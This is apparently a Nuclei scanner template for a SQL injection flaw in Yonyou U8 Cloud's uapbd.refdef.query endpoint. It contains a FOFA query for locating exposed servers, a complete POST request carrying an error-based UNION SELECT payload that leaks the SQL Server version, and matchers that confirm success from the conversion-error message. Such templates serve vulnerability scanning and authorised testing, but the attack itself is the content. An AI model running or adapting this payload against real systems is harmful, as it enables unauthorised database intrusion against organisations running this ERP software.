script_name: 用友U8 Cloud uapbd.refdef.query接口存在SQL注入漏洞
content:
info:
    name: 用友U8 Cloud uapbd.refdef.query接口存在SQL注入漏洞
    author: Harry
    severity: high
    description: |
    metadata:
        FOFA:title=="U8C"

http:
  - raw:
    - |
        POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: 64

        {"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
    matchers:
      - type: dsl
        dsl:
            - 'status_code == 200'
            - 'contains(body, "转换成数据类型 int 时失败")'
        condition: and
help: 用友U8 Cloud uapbd.refdef.query接口存在SQL注入漏洞
author: &#31909
